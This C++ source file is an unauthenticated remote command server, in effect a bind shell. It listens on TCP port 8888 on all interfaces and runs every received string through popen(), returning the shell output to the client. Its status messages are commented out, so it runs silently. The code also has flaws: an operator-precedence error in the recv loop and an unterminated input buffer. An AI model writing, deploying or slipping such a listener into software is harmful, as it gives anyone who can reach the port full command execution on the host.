#include <stdio.h>
#include <cstdio>
#include <iostream>
#include <memory>
#include <array>
#include <stdexcept>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h> 
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <string.h>
#include <string>

#define MAXLINE 256

using namespace std;
using std::string;

//Cred: http://stackoverflow.com/questions/478898/how-to-execute-a-command-and-get-output-of-command-within-c-using-posix
std::string exec(const char* cmd) {
    std::array<char, 128> buffer;
    std::string result;
    std::shared_ptr<FILE> pipe(popen(cmd, "r"), pclose);
    if (!pipe) throw std::runtime_error("popen() failed!");
    while(!feof(pipe.get())) {
        if(fgets(buffer.data(), 128, pipe.get()) != NULL) {
            result += buffer.data();
        }
    }
    return result;
}

int main(int argc, char *argv[])
{
	int listenfd, connfd, n;
	socklen_t clilen;
	char buf[MAXLINE];
	struct sockaddr_in cliaddr, servaddr;
	
	int port = 8888;
	
	listenfd = socket(AF_INET, SOCK_STREAM, 0);
	
	servaddr.sin_family = AF_INET;
	servaddr.sin_addr.s_addr = htonl(INADDR_ANY);
	servaddr.sin_port = htons(port);
	
	bind(listenfd, (struct sockaddr *) &servaddr, sizeof(servaddr));

	listen(listenfd, 4);
    //printf("%s\n", "Server running, waiting for connections...");
	
	while(1) {
		clilen = sizeof(cliaddr);
		connfd = accept(listenfd, (struct sockaddr*) &cliaddr, &clilen);
        //printf("%s\n", "Connection established...");
		while((n=recv(connfd, buf, MAXLINE, 0) > 0)) {
			//printf("String received from the client: %s\n", buf);
            string results;
            results = exec(buf);
            if (results.length() <= 0) {
                results = "empty";
            }
			send(connfd, results.c_str(), results.length(), 0);
			memset(buf, 0, sizeof(buf));
		}
		if(n<0) {
			perror("Read error");
			exit(1);
		}
		close(connfd);
	}
	close(listenfd);
}
